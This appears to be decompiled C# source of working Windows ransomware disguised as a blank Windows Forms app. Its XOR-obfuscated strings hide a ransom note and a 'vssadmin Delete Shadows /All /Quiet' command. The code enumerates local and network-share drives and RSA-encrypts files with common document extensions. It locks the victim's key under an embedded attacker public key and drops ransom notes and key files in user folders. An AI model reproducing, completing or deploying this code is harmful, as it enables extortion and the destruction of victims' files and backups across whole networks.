using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;

namespace ollmp;

public class Form1 : Form
{
	private byte X = 111;

	private int blocksize = 245;

	private int repeatCount = 3;

	private string publicKey = "";

	private string keyCode;

	private string keyfile = "";

	private string kfName = "";

	private string kfExt = "";

	private string pbK = "";

	private string privateKey = "";

	private List<string> SpecFolders = new List<string>();

	private List<string> extensions = new List<string>();

	private List<string> FullList = new List<string>();

	private string NoteFile = "";

	private string noteText = "";

	private byte[] _keyCode = new byte[9] { 1, 31, 1, 11, 24, 11, 9, 2, 11 };

	private IContainer components = null;

	public Form1()
	{
		InitializeComponent();
		RK(3);
		RK(4);
		if (!FP())
		{
			RK(2);
			Init();
		}
	}

	private void Init()
	{
		RK(2);
		Prep();
		SaveNotes();
		GetDrives();
		NetScan();
	}

	private string RetFName(string f)
	{
		return f[..f.IndexOf('.')];
	}

	private string RetFExt(string f)
	{
		int num = f.IndexOf('.');
		return f.Substring(num + 1, f.Length - num - 1);
	}

	private bool FP()
	{
		bool result = false;
		Process currentProcess = Process.GetCurrentProcess();
		Process[] processesByName = Process.GetProcessesByName(currentProcess.ProcessName);
		if (processesByName.Length > 1)
		{
			result = true;
		}
		return result;
	}

	private void RK(int Z)
	{
		int num = 0;
		for (int i = 0; i < Z; i++)
		{
			for (int j = 0; j < Z; j++)
			{
				num++;
			}
		}
	}

	private void Prep()
	{
		byte[] a = new byte[11]
		{
			22, 0, 26, 29, 4, 10, 22, 65, 27, 27,
			31
		};
		byte[] a2 = new byte[18]
		{
			78, 48, 167, 162, 190, 189, 191, 188, 165, 185,
			167, 176, 48, 78, 65, 27, 23, 27
		};
		byte[] a3 = new byte[75]
		{
			173, 143, 151, 135, 79, 155, 143, 134, 132, 148,
			79, 136, 143, 151, 135, 155, 159, 129, 141, 143,
			130, 148, 79, 158, 79, 135, 158, 128, 129, 132,
			147, 136, 129, 141, 143, 130, 135, 138, 131, 79,
			133, 159, 135, 128, 157, 129, 158, 157, 129, 134,
			133, 129, 140, 129, 79, 143, 132, 140, 129, 159,
			135, 157, 131, 143, 79, 61, 60, 46, 66, 93,
			95, 91, 87, 65, 79
		};
		byte[] a4 = new byte[114]
		{
			170, 158, 132, 135, 79, 154, 129, 157, 135, 157,
			138, 79, 135, 154, 79, 141, 138, 159, 130, 156,
			157, 147, 79, 129, 157, 128, 159, 143, 141, 147,
			157, 138, 79, 129, 139, 135, 130, 79, 135, 136,
			79, 136, 143, 151, 135, 155, 159, 129, 141, 143,
			130, 130, 148, 154, 79, 155, 143, 134, 132, 129,
			141, 79, 135, 79, 155, 143, 134, 132, 79, 22,
			0, 26, 29, 4, 10, 22, 65, 27, 27, 31,
			79, 130, 143, 79, 10, 66, 2, 14, 6, 3,
			85, 79, 26, 1, 3, 12, 4, 29, 47, 31,
			29, 0, 27, 0, 1, 2, 14, 6, 3, 65,
			12, 0, 2, 79
		};
		byte[] a5 = new byte[89]
		{
			170, 158, 132, 135, 79, 141, 148, 79, 130, 138,
			79, 128, 129, 132, 156, 152, 135, 132, 135, 79,
			129, 157, 141, 138, 157, 143, 79, 141, 79, 157,
			138, 152, 138, 130, 135, 138, 79, 158, 156, 157,
			129, 133, 79, 135, 132, 135, 79, 128, 135, 158,
			147, 131, 129, 79, 141, 129, 136, 141, 159, 143,
			150, 143, 138, 157, 158, 144, 79, 158, 79, 129,
			151, 135, 142, 133, 129, 134, 79, 157, 129, 79,
			158, 133, 143, 152, 143, 134, 157, 138, 79
		};
		byte[] a6 = new byte[149]
		{
			158, 79, 158, 143, 134, 157, 143, 79, 24, 24,
			24, 65, 27, 0, 29, 31, 29, 0, 5, 10,
			12, 27, 65, 12, 0, 2, 79, 142, 159, 143,
			156, 136, 138, 159, 79, 79, 59, 32, 61, 79,
			135, 79, 158, 79, 138, 140, 129, 79, 128, 129,
			131, 129, 150, 147, 145, 79, 136, 143, 134, 139,
			135, 157, 138, 79, 130, 143, 79, 158, 143, 134,
			157, 79, 7, 27, 27, 31, 85, 64, 64, 1,
			92, 29, 93, 4, 26, 21, 7, 24, 93, 7,
			88, 23, 89, 5, 90, 65, 0, 1, 6, 0,
			1, 79, 66, 79, 79, 157, 143, 131, 79, 142,
			156, 139, 138, 157, 79, 156, 133, 143, 136, 143,
			130, 79, 139, 138, 134, 158, 157, 141, 156, 145,
			150, 135, 134, 79, 128, 129, 152, 157, 129, 141,
			148, 134, 79, 144, 150, 135, 133, 65, 79
		};
		byte[] a7 = new byte[79]
		{
			160, 129, 128, 148, 157, 133, 135, 79, 158, 143,
			131, 129, 158, 157, 129, 144, 157, 138, 132, 147,
			130, 129, 140, 129, 79, 141, 129, 158, 158, 157,
			143, 130, 129, 141, 132, 138, 130, 135, 144, 79,
			155, 143, 134, 132, 129, 141, 79, 131, 129, 140,
			156, 157, 79, 142, 138, 136, 141, 129, 136, 141,
			159, 143, 157, 130, 129, 79, 135, 154, 79, 135,
			158, 128, 129, 159, 157, 135, 157, 147, 78
		};
		byte[] a8 = new byte[415]
		{
			83, 61, 60, 46, 36, 10, 22, 57, 14, 3,
			26, 10, 81, 83, 34, 0, 11, 26, 3, 26,
			28, 81, 68, 9, 41, 54, 6, 32, 86, 44,
			39, 86, 6, 53, 24, 24, 21, 3, 28, 62,
			92, 55, 68, 30, 53, 88, 58, 22, 23, 93,
			86, 95, 32, 7, 53, 94, 56, 25, 35, 27,
			89, 12, 2, 43, 11, 90, 0, 61, 28, 35,
			0, 39, 35, 1, 0, 40, 24, 28, 94, 44,
			56, 41, 34, 32, 40, 41, 5, 27, 13, 14,
			61, 32, 60, 4, 59, 8, 92, 56, 68, 88,
			93, 64, 59, 5, 21, 39, 4, 26, 63, 31,
			93, 56, 64, 61, 44, 88, 41, 45, 44, 91,
			37, 31, 8, 8, 26, 44, 6, 91, 23, 91,
			22, 10, 91, 39, 42, 24, 61, 4, 62, 88,
			90, 27, 39, 7, 6, 8, 95, 87, 7, 61,
			36, 2, 94, 14, 88, 24, 3, 24, 54, 3,
			87, 21, 35, 46, 21, 34, 87, 46, 24, 59,
			63, 35, 7, 88, 88, 95, 34, 32, 21, 63,
			30, 41, 94, 9, 37, 34, 36, 53, 44, 46,
			27, 11, 58, 8, 38, 36, 11, 54, 33, 46,
			4, 29, 63, 94, 87, 28, 61, 13, 28, 7,
			4, 40, 33, 5, 24, 5, 34, 7, 34, 35,
			33, 13, 36, 59, 14, 54, 9, 0, 92, 30,
			38, 60, 91, 25, 27, 57, 58, 62, 27, 12,
			24, 68, 8, 86, 22, 28, 92, 53, 41, 53,
			10, 27, 36, 42, 3, 95, 53, 34, 37, 42,
			31, 91, 55, 88, 13, 91, 39, 36, 86, 25,
			30, 58, 0, 7, 63, 45, 54, 9, 45, 28,
			21, 55, 54, 89, 6, 0, 1, 90, 2, 90,
			27, 60, 60, 9, 7, 37, 36, 89, 32, 55,
			93, 39, 63, 14, 58, 89, 61, 43, 12, 14,
			5, 59, 10, 42, 12, 2, 4, 86, 6, 27,
			86, 23, 88, 92, 11, 29, 37, 3, 10, 53,
			94, 40, 68, 27, 57, 8, 35, 89, 11, 26,
			35, 55, 64, 26, 32, 56, 63, 57, 22, 6,
			95, 29, 7, 22, 25, 54, 2, 61, 29, 40,
			33, 12, 38, 62, 82, 82, 83, 64, 34, 0,
			11, 26, 3, 26, 28, 81, 83, 42, 23, 31,
			0, 1, 10, 1, 27, 81, 46, 62, 46, 45,
			83, 64, 42, 23, 31, 0, 1, 10, 1, 27,
			81, 83, 64, 61, 60, 46, 36, 10, 22, 57,
			14, 3, 26, 10, 81
		};
		noteText = DeXOR(a3, X) + "\r\n" + DeXOR(a4, X) + "\r\n" + DeXOR(a5, X) + "\r\n" + DeXOR(a6, X) + "\r\n" + DeXOR(a7, X);
		if (Environment.OSVersion.Version.Major > 5)
		{
			DelShadows();
		}
		pbK = DeXOR(a8, X);
		DeXOR(a2, X);
		NoteFile = DeXOR(a2, X);
		keyfile = DeXOR(a, X);
		kfExt = RetFExt(keyfile);
		kfName = RetFName(keyfile);
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.System);
		folderPath = folderPath.Substring(0, folderPath.ToLower().IndexOf("\\system"));
		string folderPath2 = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles);
		SpecFolders.Add(folderPath.ToLower());
		SpecFolders.Add(folderPath2.ToLower());
		SpecFolders.Add(DeXOR(new byte[12]
		{
			75, 61, 42, 44, 54, 44, 35, 42, 65, 45,
			38, 33
		}, X));
		SpecFolders.Add(DeXOR(new byte[8] { 61, 42, 44, 54, 44, 35, 42, 61 }, X));
		SpecFolders.Add(DeXOR(new byte[25]
		{
			60, 22, 28, 27, 10, 2, 79, 57, 0, 3,
			26, 2, 10, 79, 38, 1, 9, 0, 29, 2,
			14, 27, 6, 0, 1
		}, X));
		SetExts();
		SetList();
		RSACryptoServiceProvider rSACryptoServiceProvider = new RSACryptoServiceProvider(2048);
		publicKey = rSACryptoServiceProvider.ToXmlString(includePrivateParameters: false);
		privateKey = CryptKey(rSACryptoServiceProvider.ToXmlString(includePrivateParameters: true));
	}

	private string CryptKey(string s)
	{
		string text = "";
		byte[] array = new byte[s.Length];
		byte[] array2 = new byte[blocksize];
		byte[] array3 = new byte[blocksize + 11];
		double num = Math.Ceiling((double)s.Length / (double)blocksize);
		if ((double)s.Length < num * (double)blocksize)
		{
			int length = s.Length;
			for (int i = 0; (double)i < num * (double)blocksize - (double)length; i++)
			{
				s += " ";
			}
		}
		array = Encoding.Default.GetBytes(s);
		Array.Reverse((Array)array);
		try
		{
			RSACryptoServiceProvider rSACryptoServiceProvider = new RSACryptoServiceProvider(2048);
			rSACryptoServiceProvider.FromXmlString(pbK);
			for (int j = 0; (double)j < num; j++)
			{
				Array.Copy(array, j * blocksize, array2, 0, blocksize);
				array3 = rSACryptoServiceProvider.Encrypt(array2, fOAEP: false);
				text += Encoding.Default.GetString(array3);
			}
		}
		catch
		{
		}
		return text;
	}

	private void SetExts()
	{
		extensions.Add(DeXOR(new byte[3] { 65, 12, 11 }, X));
		extensions.Add(DeXOR(new byte[4] { 65, 3, 11, 9 }, X));
		extensions.Add(DeXOR(new byte[4] { 65, 2, 11, 9 }, X));
		extensions.Add(DeXOR(new byte[4] { 65, 2, 14, 23 }, X));
		extensions.Add(DeXOR(new byte[4] { 65, 11, 13, 9 }, X));
		extensions.Add(DeXOR(new byte[4] { 65, 10, 31, 9 }, X));
		extensions.Add(DeXOR(new byte[4] { 65, 94, 12, 11 }, X));
		extensions.Add(DeXOR(new byte[3] { 65, 2, 11 }, X));
		extensions.Add(DeXOR(new byte[3] { 65, 11, 13 }, X));
		extensions.Add(DeXOR(new byte[4] { 65, 31, 11, 9 }, X));
		extensions.Add(DeXOR(new byte[4] { 65, 31, 31, 27 }, X));
		extensions.Add(DeXOR(new byte[4] { 65, 23, 3, 28 }, X));
		extensions.Add(DeXOR(new byte[4] { 65, 11, 0, 12 }, X));
		extensions.Add(DeXOR(new byte[4] { 65, 14, 29, 5 }, X));
		extensions.Add(DeXOR(new byte[4] { 65, 27, 14, 29 }, X));
		extensions.Add(DeXOR(new byte[3] { 65, 88, 21 }, X));
		extensions.Add(DeXOR(new byte[4] { 65, 29, 14, 29 }, X));
		extensions.Add(DeXOR(new byte[4] { 65, 21, 6, 31 }, X));
		extensions.Add(DeXOR(new byte[4] { 65, 27, 6, 9 }, X));
		extensions.Add(DeXOR(new byte[4] { 65, 5, 31, 8 }, X));
		extensions.Add(DeXOR(new byte[3] { 65, 14, 6 }, X));
		extensions.Add(DeXOR(new byte[4] { 65, 13, 2, 31 }, X));
		extensions.Add(DeXOR(new byte[4] { 65, 31, 1, 8 }, X));
		extensions.Add(DeXOR(new byte[4] { 65, 12, 11, 29 }, X));
		extensions.Add(DeXOR(new byte[4] { 65, 31, 28, 11 }, X));
		extensions.Add(DeXOR(new byte[5] { 65, 5, 31, 10, 8 }, X));
		extensions.Add(DeXOR(new byte[5] { 65, 11, 0, 12, 23 }, X));
		extensions.Add(DeXOR(new byte[5] { 65, 23, 3, 28, 23 }, X));
		extensions.Add(DeXOR(new byte[5] { 65, 31, 31, 27, 23 }, X));
		extensions.Add(DeXOR(new byte[6] { 65, 14, 12, 12, 11, 13 }, X));
		extensions.Add(DeXOR(new byte[4] { 65, 2, 11, 13 }, X));
		extensions.Add(DeXOR(new byte[4] { 65, 29, 27, 9 }, X));
		extensions.Add(DeXOR(new byte[4] { 65, 0, 11, 27 }, X));
		extensions.Add(DeXOR(new byte[4] { 65, 0, 11, 28 }, X));
		extensions.Add(DeXOR(new byte[4] { 65, 0, 11, 13 }, X));
		extensions.Add(DeXOR(new byte[4] { 65, 0, 11, 8 }, X));
		extensions.Add(DeXOR(new byte[4] { 65, 12, 29, 93 }, X));
		extensions.Add(DeXOR(new byte[4] { 65, 1, 10, 9 }, X));
		extensions.Add(DeXOR(new byte[4] { 65, 1, 29, 9 }, X));
		extensions.Add(DeXOR(new byte[4] { 65, 0, 29, 9 }, X));
		extensions.Add(DeXOR(new byte[4] { 65, 14, 29, 24 }, X));
		extensions.Add(DeXOR(new byte[4] { 65, 28, 29, 93 }, X));
		extensions.Add(DeXOR(new byte[4] { 65, 28, 29, 9 }, X));
	}

	private bool CrVer(string A)
	{
		bool result = false;
		byte[] array = new byte[_keyCode.Length];
		byte[] array2 = File.ReadAllBytes(A);
		Array.Copy(array2, array2.Length - _keyCode.Length, array, 0, _keyCode.Length);
		if (array.SequenceEqual(_keyCode))
		{
			result = true;
		}
		return result;
	}

	private int AmountFiles(string f)
	{
		int result = 0;
		try
		{
			string[] files = Directory.GetFiles(f, kfName + "*." + kfExt);
			result = files.Length;
		}
		catch
		{
		}
		return result;
	}

	private void AddNote(string f)
	{
		string currentDirectory = Environment.CurrentDirectory;
		if (f != currentDirectory)
		{
			try
			{
				SaveToFile(f + "\\" + NoteFile, noteText);
			}
			catch
			{
			}
		}
	}

	private void SaveToFile(string path, string txt)
	{
		try
		{
			File.WriteAllText(path, txt);
		}
		catch
		{
		}
	}

	private void SaveKey(string f, string k)
	{
		string text = keyfile.Substring(0, keyfile.Length - 4);
		if (!File.Exists(f + "\\" + keyfile))
		{
			try
			{
				SaveToFile(f + "\\" + keyfile, k);
				return;
			}
			catch
			{
				return;
			}
		}
		try
		{
			SaveToFile(f + "\\" + text + AmountFiles(f) + "." + kfExt, k);
		}
		catch
		{
		}
	}

	private void GetDrives()
	{
		try
		{
			string[] logicalDrives = Environment.GetLogicalDrives();
			for (int i = 0; i < logicalDrives.Length; i++)
			{
				DriveInfo driveInfo = new DriveInfo(logicalDrives[i]);
				if (driveInfo.DriveType == DriveType.Fixed || driveInfo.DriveType == DriveType.Network)
				{
					GetDirs(driveInfo.RootDirectory);
				}
			}
		}
		catch
		{
		}
	}

	private void GetDirs(DirectoryInfo pth)
	{
		try
		{
			DirectoryInfo[] directories = pth.GetDirectories();
			DirectoryInfo[] array = directories;
			foreach (DirectoryInfo directoryInfo in array)
			{
				GetFiles(directoryInfo);
				GetDirs(directoryInfo);
			}
		}
		catch
		{
		}
	}

	private void NetScan()
	{
		for (int i = 0; i < FullList.Count; i++)
		{
			DirectoryInfo pth = new DirectoryInfo(FullList[i].ToString());
			GetDirs(pth);
		}
	}

	private void SetList()
	{
		List<string> list = new List<string>();
		Process process = new Process();
		process.StartInfo.FileName = "cmd";
		process.StartInfo.Arguments = "/C net view";
		process.StartInfo.RedirectStandardOutput = true;
		process.StartInfo.UseShellExecute = false;
		process.StartInfo.CreateNoWindow = true;
		try
		{
			process.Start();
			string text = process.StandardOutput.ReadToEnd();
			int startIndex = 0;
			int num = 0;
			while (true)
			{
				startIndex = text.IndexOf('\\', startIndex);
				if (startIndex != -1)
				{
					num = text.IndexOf(' ', startIndex);
					list.Add(text.Substring(startIndex, num - startIndex));
					startIndex = num;
					continue;
				}
				break;
			}
		}
		catch
		{
		}
		for (int i = 0; i < list.Count; i++)
		{
			Process process2 = new Process();
			process2.StartInfo.FileName = "cmd";
			process2.StartInfo.Arguments = "/C net view " + list[i];
			process2.StartInfo.RedirectStandardOutput = true;
			process2.StartInfo.UseShellExecute = false;
			process2.StartInfo.CreateNoWindow = true;
			try
			{
				process2.Start();
				string s = process2.StandardOutput.ReadToEnd();
				byte[] bytes = Encoding.GetEncoding(1251).GetBytes(s);
				string @string = Encoding.GetEncoding("CP866").GetString(bytes);
				string[] array = @string.Split('\r', '\n');
				for (int j = 0; j < array.Length; j++)
				{
					if (array[j].IndexOf("Диск") > -1)
					{
						FullList.Add(list[i] + "\\" + array[j].Substring(0, array[j].IndexOf("Диск")));
					}
				}
			}
			catch
			{
			}
		}
	}

	private void SaveNotes()
	{
		List<string> list = new List<string>();
		list.Add(Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory));
		list.Add(Environment.GetFolderPath(Environment.SpecialFolder.Startup));
		list.Add(Environment.GetFolderPath(Environment.SpecialFolder.Personal));
		for (int i = 0; i < list.Count; i++)
		{
			SaveKey(list[i], privateKey);
			AddNote(list[i]);
		}
	}

	private void GetFiles(DirectoryInfo folder)
	{
		try
		{
			string[] files = Directory.GetFiles(folder.FullName, "*.*");
			string[] array = files;
			foreach (string text in array)
			{
				foreach (string extension in extensions)
				{
					if (text.ToLower().IndexOf(extension) > -1 && !CrVer(text))
					{
						string f = text;
						CF(f);
					}
				}
			}
		}
		catch
		{
		}
	}

	private void CF(string f1)
	{
		byte[] array = new byte[blocksize];
		try
		{
			byte[] array2 = File.ReadAllBytes(f1);
			if (array2.Length / (repeatCount + 5) >= blocksize)
			{
				RSACryptoServiceProvider rSACryptoServiceProvider = new RSACryptoServiceProvider(2048);
				rSACryptoServiceProvider.FromXmlString(publicKey);
				byte[] array3 = new byte[array2.Length + repeatCount * 11 + _keyCode.Length];
				byte[] array4 = new byte[array2.Length - repeatCount * blocksize];
				for (int i = 0; i < repeatCount; i++)
				{
					Array.Copy(array2, blocksize * i, array, 0, blocksize);
					byte[] array5 = rSACryptoServiceProvider.Encrypt(array, fOAEP: false);
					Array.Copy(array5, 0, array3, i * (blocksize + 11), array5.Length);
				}
				Array.Copy(array2, repeatCount * blocksize, array4, 0, array4.Length);
				Array.Copy(array4, 0, array3, repeatCount * (blocksize + 11), array4.Length);
				Array.Copy(_keyCode, 0, array3, array3.Length - _keyCode.Length, _keyCode.Length);
				try
				{
					File.WriteAllBytes(f1, array3);
					return;
				}
				catch
				{
					return;
				}
			}
		}
		catch
		{
		}
	}

	private void DelShadows()
	{
		byte[] a = new byte[12]
		{
			25, 28, 28, 14, 11, 2, 6, 1, 65, 10,
			23, 10
		};
		byte[] a2 = new byte[26]
		{
			43, 10, 3, 10, 27, 10, 79, 60, 7, 14,
			11, 0, 24, 28, 79, 64, 46, 3, 3, 79,
			64, 62, 26, 6, 10, 27
		};
		Process process = new Process();
		process.StartInfo.FileName = DeXOR(a, X);
		process.StartInfo.Arguments = DeXOR(a2, X);
		process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		process.StartInfo.CreateNoWindow = true;
		process.StartInfo.UseShellExecute = true;
		process.StartInfo.Verb = "runas";
		try
		{
			process.Start();
		}
		catch
		{
		}
	}

	private string DeXOR(byte[] A, int x)
	{
		byte[] array = new byte[A.Length];
		for (int i = 0; i < A.Length; i++)
		{
			array[i] = (byte)(A[i] ^ x);
		}
		return Encoding.Default.GetString(array);
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		RK(2);
		((Form)this).Close();
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		((Control)this).SuspendLayout();
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(284, 261));
		((Control)this).set_Name("Form1");
		((Control)this).set_Text("Form1");
		((Form)this).add_Load((EventHandler)Form1_Load);
		((Control)this).ResumeLayout(false);
	}
}
